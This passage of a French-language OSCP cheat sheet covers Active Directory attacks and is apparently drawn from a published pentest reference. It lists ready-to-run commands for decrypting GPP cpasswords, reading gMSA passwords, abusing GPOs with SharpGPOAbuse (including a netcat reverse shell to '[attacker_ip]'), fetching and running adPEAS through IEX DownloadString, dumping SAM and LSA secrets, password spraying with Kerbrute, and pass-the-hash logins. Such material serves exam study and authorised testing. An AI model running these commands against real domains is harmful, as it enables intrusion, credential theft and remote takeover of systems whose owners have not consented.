`ldap`  


**LDAP**


**Paramètres et repères :**
`mssql`  


**mssql**


**Paramètres et repères :**
`mysql`  


**mysql**


**Paramètres et repères :**
`nfs`  


**nfs**


**Paramètres et repères :**
`oracle`  


**oracle**


**Paramètres et repères :**
`pgsq`  


**pgsq**


**Paramètres et repères :**
`pop3`  


**pop3**


**Paramètres et repères :**
`rpc`  


**rpc**


**Paramètres et repères :**
`smtp`  


**smtp**


**Paramètres et repères :**
`svc`  


**svc**


**Paramètres et repères :**
`termsrv`  


**termsrv**


**Paramètres et repères :**
`wsman`  


**wsman**


## GPP Passwords Abuse (Group Policy Preferences)

Vérifier les comptes, les secrets et les mécanismes d'authentification.


### GPP Main Method for Extraction


<p class="oscp-command-note">Examiner les comptes ou ressources Windows.</p>

```powershell
net use z:\\[hostname/domain]\SYSVOL

```


**Paramètres et repères :**
`Groups.xml`  




<p class="oscp-inline-ref"><strong>Chemin ou clé Windows :</strong> <code>\hostname.domain\Policies\{00000000-0000-0000-0000-00000000000}\MACHINE\Preferences\Groups\Groups.xml</code></p>


<p class="oscp-command-note">Lister les fichiers du répertoire.</p>

```powershell
dir /s Groups.xml

type Groups.xml

```


**Paramètres et repères :**
`Hash` · `cpassword`  


<p class="oscp-command-note">Script shell dans la rubrique « GPP Main Method for Extraction ».</p>

```bash
gpp-decrypt [gpp_hash/cpassword]

# Exemple
gpp-decrypt riBZpPtHOGtVk+SdLOmJ6xiNgFH6Gp45BoP3I6AnPgZ1IfxtgI67qqZfgh78kBZB
sup3r53cr3tGP0pa55

```


<p class="oscp-command-note">Lister les fichiers du répertoire.</p>

```bash
# Vérifiez le mot de passe cpass dans le partage SYSvol pour obtenir des mots de passe clairs dans les fichiers XML.
dir \\\\<domain>\\SYSVOL\\<domain>\\Policies\\ /s /b | findstr cpassword

# Recherchez les fichiers Groups.xml qui peuvent contenir des mots de passe clairs.
smbclient //dc-ip/SYSVOL -U "domain\username"

```


### Impacket-Get-GPPPassword

Vérifier les comptes, les secrets et les mécanismes d'authentification.


**Paramètres et repères :**
`Impacket-Get-GPPPassword` · `Get-GPPPassword.py`  




```bash
# Examiner les préférences de groupe GPP
Get-GPPPassword.py -no-pass '[DOMAIN_CONTROLLER]'

```


```bash
# Examiner les préférences de groupe GPP
Get-GPPPassword.py '[DOMAIN]'/'[USER]':'[PASSWORD]'@'[DOMAIN_CONTROLLER]'

```


```bash
# Examiner les préférences de groupe GPP
Get-GPPPassword.py -hashes :'[NThash]' '[DOMAIN]'/'[USER]':'[PASSWORD]'@'[DOMAIN_CONTROLLER]'

```


```bash
# Examiner les préférences de groupe GPP
Get-GPPPassword.py -xmlfile '/path/to/Policy.xml' 'LOCAL'

```


### SMB Share-SYSVOL

Examiner les objets, les droits et les services du domaine.




```bash
# Référence à un script pour télécharger des fichiers dans SYSVOL
https://github.com/ahmetgurel/Pentest-Hints/blob/master/AD%20Hunting%20Passwords%20In%20SYSVOL.md

```


**Paramètres et repères :**
`cpassword`  


<p class="oscp-command-note">Rechercher un motif textuel.</p>

```bash
grep -inr "cpassword"

```


### CrackMapExec


<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>

```bash
crackmapexec smb <TARGET[s]> -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -M gpp_password

```


```bash
# Utiliser le module gpp_password
crackmapexec smb <TARGET[s]> -u <USERNAME> -H LMHash:NTLMHash -d <DOMAIN> -M gpp_password

```


### Importing the Module

Vérifier les ports et les services de la cible autorisée.


<p class="oscp-command-note">Exécuter un script PowerShell.</p>

```powershell
powershell -ExecutionPolicy Bypass

# Utilisez l'une des options suivantes
Import-Module .\adPEAS.ps1

. .\adPEAS.ps1

gc -raw .\adPEAS.ps1 | iex

IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1')

```


### De base Usage


**Paramètres et repères :**
`Invoke-adPEAS`  




```powershell
# Recenser les objets Active Directory avec adPEAS
Invoke-adPEAS -Domain '[domain].com' -Outputfile 'C:\temp\adPEAS_outputfile' -NoColor

```


```powershell
# Recenser les objets Active Directory avec adPEAS
Invoke-adPEAS -Domain '[domain].com' -Server 'dc1.[domain].com'

```


<p class="oscp-command-note">Script PowerShell dans la rubrique « De base Usage ».</p>

```powershell
$SecPassword = ConvertTo-SecureString '[password]' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('[domain]\[userName]', $SecPassword)
Invoke-adPEAS -Domain '[domain].com' -Cred $Cred

```




```powershell
# Recenser les objets Active Directory avec adPEAS
Invoke-adPEAS -Domain '[domain].com' -Server 'dc1.[domain].com' -Username '[domain]\[userName]' -Password '[password]' -Force

```


### Module-Specific Usage




```powershell
Invoke-adPEAS -Module Domain

```


```powershell
# Recenser les objets Active Directory avec adPEAS
Invoke-adPEAS -Module Rights

```


```powershell
# Recenser les objets Active Directory avec adPEAS
Invoke-adPEAS -Module GPO

```


```powershell
# Recenser les objets Active Directory avec adPEAS
Invoke-adPEAS -Module ADCS

```


```powershell
# Recenser les objets Active Directory avec adPEAS
Invoke-adPEAS -Module Creds

```


```powershell
# Recenser les objets Active Directory avec adPEAS
Invoke-adPEAS -Module Delegation

```


```powershell
# Recenser les objets Active Directory avec adPEAS
Invoke-adPEAS -Module Accounts

```


```powershell
# Recenser les objets Active Directory avec adPEAS
Invoke-adPEAS -Module Computer

```


```powershell
# Recenser les objets Active Directory avec adPEAS
Invoke-adPEAS -Module Bloodhound

```


```powershell
# Recenser les objets Active Directory avec adPEAS
Invoke-adPEAS -Module Bloodhound -Scope All

```


#### Manual Découverte of gMSAs


**Paramètres et repères :**
`Get-ADServiceAccount` · `msDS-ManagedPassword`  


<p class="oscp-command-note">Examiner les informations AD ou réseau en PowerShell.</p>

```powershell
Get-ADServiceAccount -Filter {ObjectClass -eq "msDS-GroupManagedServiceAccount"} -Properties *

```


**Paramètres et repères :**
`Get-ADServiceAccount`  




```powershell
# Rechercher un objet Active Directory
Get-ADObject -LDAPFilter "(objectClass=msDS-GroupManagedServiceAccount)" -Properties *

```


**Paramètres et repères :**
`msDS-ManagedPassword`  


#### Automated Découverte with BloodHound

Examiner les objets, les droits et les services du domaine.


**Paramètres et repères :**
`SharpHound`  




```powershell
# Collecter les relations Active Directory
SharpHound.exe -c All

```


**Paramètres et repères :**
`ReadProperty` · `msDS-ManagedPassword`  


<p class="oscp-command-note">Rechercher des fichiers selon un filtre.</p>

```text
Find Principals with Unusual Rights on Password Attributes

```


### Récupération de mot de passe GMSA avec GMSAMot de passeReader

Vérifier les comptes, les secrets et les mécanismes d'authentification.


**Paramètres et repères :**
`GMSAPasswordReader.exe` · `msDS-ManagedPassword`  


#### Usage


**Paramètres et repères :**
`GMSAPasswordReader.exe`  


<p class="oscp-command-note">Script PowerShell dans la rubrique « Usage ».</p>

```powershell
.\GMSAPasswordReader.exe --AccountName [GMSA_ACCOUNT_NAME]

# Exemple
.\GMSAPasswordReader.exe --accountname 'svc_apache'
# Le résultat peut contenir une clé rc4_hmac liée au hash NT du compte. Préserver les paramètres exacts : hashcat -m 1000 '[ntlm_hash]' [wordlist] ; le compte de service peut être nommé svc_apache$ (exemple source : evil-winrm -i [ip] -u svc_apache$ -H [ntlm_hash]).

```


#### Notes complémentaires


**Paramètres et repères :**
`msDS-ManagedPassword`  


### Commandes alternatives


**Paramètres et repères :**
`GMSAPasswordReader.exe` · `msDS-ManagedPassword`  


<p class="oscp-command-note">Examiner les informations AD ou réseau en PowerShell.</p>

```powershell
# Trouver tous les comptes gMSA
Get-ADServiceAccount -Filter {ObjectClass -eq "msDS-GroupManagedServiceAccount"} -Properties msDS-ManagedPassword

```


**Paramètres et repères :**
`Get-ADObject` · `Get-ADServiceAccount` · `msDS-ManagedPassword`  




```powershell
# Rechercher un objet Active Directory
Get-ADObject -Filter 'ObjectClass -eq "msDS-GroupManagedServiceAccount"' -Properties msDS-ManagedPassword

```


**Paramètres et repères :**
`Get-ADAttributeEditor` · `msDS-ManagedPassword`  


<p class="oscp-command-note">Interroger les objets de l&#x27;annuaire LDAP.</p>

```bash
ldapsearch -x -H ldap://<domain_controller> -D "<user>@<domain>" -w "<password>" -b "DC=domain,DC=com" "(objectClass=msDS-GroupManagedServiceAccount)" msDS-ManagedPassword

```


**Paramètres et repères :**
`Get-DomainGMSA` · `msDS-ManagedPassword`  




```powershell
# Liste des comptes gMSA avec PowerView
Get-DomainGMSA -Properties msDS-ManagedPassword

```


## Group Policy Object (GPO) Abuse

Examiner les objets, les droits et les services du domaine.


<p class="oscp-command-note">Exécuter un script PowerShell.</p>

```powershell
powershell -ExecutionPolicy bypass
Import-Module ./PowerView.ps1

```


<p class="oscp-command-note">Examiner les informations AD ou réseau en PowerShell.</p>

```powershell
Get-NetGPO | select displayname

```




```powershell
Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')} | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

```


**Paramètres et repères :**
`WriteGPO` · `OwnsGPO`  




<p class="oscp-inline-ref"><strong>Type de relation AD :</strong> <code>GPO control</code></p>




```powershell
# Examiner une stratégie de groupe
Get-GPO -Name "[DisplayName]"

```


```powershell
# Examiner une stratégie de groupe
Get-GPO -Guid [gpo_id]

```




```powershell
Get-GPPermission -Guid [gpo_id] -TargetType User -TargetName [user]

```


**Paramètres et repères :**
`SharpGPOAbuse`  




```powershell
./SharpGPOAbuse.exe --AddComputerTask --TaskName "test" --Author "[current_user]" --Command "cmd.exe" --Arguments "/c c:\path\to\nc.exe [attacker_ip] [port] -e cmd.exe" --GPOName "[GPO_to_abuse]"

```




```powershell
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName "[GPO_to_abuse]"

```




```powershell
gpupdate /force

```


## Enumerating Domain Controller

Examiner les objets, les droits et les services du domaine.


### Utilisation de Enum4linux

Examiner les permissions et la configuration de Linux.


<p class="oscp-command-note">Examiner les informations SMB et du domaine.</p>

```bash
enum4linux -U <DOMAIN_IP>

```


```bash
enum4linux -a <DOMAIN_IP>

```


```bash
enum4linux -u <VALID_USERNAME> -p <VALID_PASSWORD> <DOMAIN_IP>

```


```bash
enum4linux -a <DOMAIN_IP> > domain_enum.txt

```


### Utilisation de CrackMapExec


<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>

```bash
crackmapexec smb <DOMAIN_IP> -u <VALID_USERNAME> -p <VALID_PASSWORD> --shares

```


```bash
# Vérifier l'accès SMB
crackmapexec smb <DOMAIN_IP> -u <VALID_USERNAME> -p <VALID_PASSWORD> --gpp-password

```


```bash
# Examiner les données SAM accessibles
crackmapexec smb <DOMAIN_IP> -u <VALID_USERNAME> -p <VALID_PASSWORD> --sam

```


```bash
# Examiner les secrets LSA accessibles
crackmapexec smb <DOMAIN_IP> -u <VALID_USERNAME> -p <VALID_PASSWORD> -d [domain].com --lsa

```


```bash
# Lister les utilisateurs
crackmapexec ldap <DOMAIN_IP> -u <VALID_USERNAME> -p <VALID_PASSWORD> -d [domain].com --users

```


### Utilisation de Ldapsearch

Examiner les objets, les droits et les services du domaine.


<p class="oscp-command-note">Interroger les objets de l&#x27;annuaire LDAP.</p>

```bash
ldapsearch -x -h <DOMAIN_IP> -s base

```


```bash
# Interroger l'annuaire LDAP
ldapsearch -x -h <DOMAIN_IP> -D "<VALID_USERNAME>@[domain].com" -w <VALID_PASSWORD> -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName

```


```bash
# Interroger l'annuaire LDAP
ldapsearch -x -h <DOMAIN_IP> -D "<VALID_USERNAME>@[domain].com" -w <VALID_PASSWORD> -b "DC=domain,DC=local" "(objectClass=computer)" name

```


```bash
# Interroger l'annuaire LDAP
ldapsearch -x -h <DOMAIN_IP> -D "<VALID_USERNAME>@[domain].com" -w <VALID_PASSWORD> -b "DC=domain,DC=local"

```


### Utilisation de Rpcclient


<p class="oscp-command-note">Examiner les objets exposés par RPC.</p>

```bash
rpcclient -U <VALID_USERNAME>%<VALID_PASSWORD> <DOMAIN_IP>

```


```bash
# Lister les utilisateurs via RPC
rpcclient $> enumdomusers

```


```bash
# Interroger les informations RPC
rpcclient $> enumdomgroups

```


```bash
# Interroger les informations RPC
rpcclient $> netshareenum

```


```bash
# Interroger les informations RPC
rpcclient $> querydominfo

```


### Utilisation de Smbclient

Examiner les objets, les droits et les services du domaine.


<p class="oscp-command-note">Parcourir un partage SMB.</p>

```bash
smbclient -L //<DOMAIN_IP> -U <VALID_USERNAME>%<VALID_PASSWORD>

```


```bash
# Explorer les partages SMB
smbclient //<DOMAIN_IP>/NETLOGON -U <VALID_USERNAME>%<VALID_PASSWORD>

```


```bash
# Explorer les partages SMB
smbclient //<DOMAIN_IP>/SYSVOL -U <VALID_USERNAME>%<VALID_PASSWORD> -c "get important_file.txt"

```


### Utilisation de BloodHound (SharpHound)

Examiner les objets, les droits et les services du domaine.


**Paramètres et repères :**
`SharpHound`  




```bash
# Collecter les relations Active Directory
SharpHound.exe -c All -d [domain].com -u <VALID_USERNAME> -p <VALID_PASSWORD> -dc <DOMAIN_IP>

```


### Utilisation de Nmap

Vérifier les ports et les services de la cible autorisée.


<p class="oscp-command-note">Identifier les versions des services.</p>

```bash
nmap -p 88,135,139,389,445,636,3268,3389 -sC -sV -Pn <DOMAIN_IP>

```


<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>

```bash
nmap --script smb-enum-shares,smb-enum-users -p445 <DOMAIN_IP>

```


```bash
# Exécuter les scripts NSE sélectionnés
nmap --script ldap-search -p389 <DOMAIN_IP>

```


### Utilisation de Kerbrute


<p class="oscp-command-note">Examiner les comptes Kerberos du domaine.</p>

```bash
# A good wordlist of usernames is /usr/share/SecList/Usernames/xato-usernames-top-1millions-20000.txt
kerbrute userenum --dc <DOMAIN_IP> -d [domain].com userlist.txt

```


```bash
kerbrute passwordspray --dc <DOMAIN_IP> -d [domain].com userlist.txt <PASSWORD>

```


### Utilisation de PowerShell (si autorisé)

Observer les permissions et la configuration de Windows.


<p class="oscp-command-note">Énumérer les utilisateurs du domaine.</p>

```powershell
Get-ADUser -Filter * -Property * | Select-Object Name, SamAccountName, EmailAddress

```


```powershell
# Énumérer les groupes Active Directory
Get-ADGroup -Filter * | Select-Object Name, GroupScope

```


### Tips for CrackMapExec Énumération


<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>

```bash
nmap -p 445 --script smb-os-discovery <IP_RANGE>

```


**Paramètres et repères :**
`--local-auth` (authentification locale)  


<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>

```bash
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> --shares --users

```


**Paramètres et repères :**
`smbclient`  


<p class="oscp-command-note">Parcourir un partage SMB.</p>

```bash
smbclient //<DOMAIN_IP>/<SHARE> -U <USERNAME>

```


### Énumération des utilisateurs


<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>

```bash
# Énumérer les utilisateurs valides et leurs privilèges
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> --users

# Vérifiez pour les utilisateurs avec les privilèges d'administration
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> --admin

# Énumérer les utilisateurs avec des identifiants valides (mot de passe)
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> --users -d <DOMAIN_NAME>

# Énumérer les utilisateurs avec un hachage NTLM valide
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> --users -d <DOMAIN_NAME>

```


### Shares Énumération


<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>

```bash
# Énumérer les parts accessibles avec les références fournies
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> --shares

# Lister les actions accessibles en utilisant un mot de passe
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> --shares -d <DOMAIN_NAME>

# Lister les actions accessibles en utilisant un hachage NTLM
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> --shares -d <DOMAIN_NAME>

```


### Group Énumération


<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>

```bash
# Liste des groupes dans le domaine
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> --groups -d <DOMAIN_NAME>

# Avec hachage NTLM
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> --groups -d <DOMAIN_NAME>

```


### Politique de mots de passe Énumération


<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>

```bash
# Vérifiez les politiques de mot de passe de domaine
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> --pass-pol -d <DOMAIN_NAME>

```


### Local Accounts Énumération


<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>

```bash
# Lister les utilisateurs et les parts sur une machine locale
crackmapexec smb <IP> -u <USERNAME> -p <PASSWORD> --users --shares --local-auth

```


### LDAP Énumération

Examiner les objets, les droits et les services du domaine.


<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>

```bash
# Dump domain users
crackmapexec ldap <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> --users

# Dump domain groups
crackmapexec ldap <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> --groups

```


### MSSQL Énumération

Examiner les connexions, la configuration et les requêtes de la base de données.


<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>

```bash
# Liste des bases de données
crackmapexec mssql <TARGET_IP> -u <USERNAME> -p <PASSWORD> --dbs

# Exécuter les requêtes SQL
crackmapexec mssql <TARGET_IP> -u <USERNAME> -p <PASSWORD> -q "SELECT name FROM master.dbo.sysdatabases"

```

---

Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).

<!-- refined-oscp -->
